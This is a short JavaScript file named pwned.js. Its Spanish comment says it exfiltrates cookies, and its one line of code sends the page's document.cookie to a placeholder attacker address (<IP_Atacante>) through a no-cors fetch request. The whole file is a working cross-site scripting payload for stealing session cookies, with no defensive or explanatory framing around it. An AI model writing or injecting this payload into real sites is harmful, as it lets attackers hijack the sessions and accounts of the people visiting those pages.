// pwned.js - exfiltra cookies mediante fetch (asíncrono)
fetch('http://<IP_Atacante>/log?c=' + encodeURIComponent(document.cookie), {method: 'GET', mode: 'no-cors'});
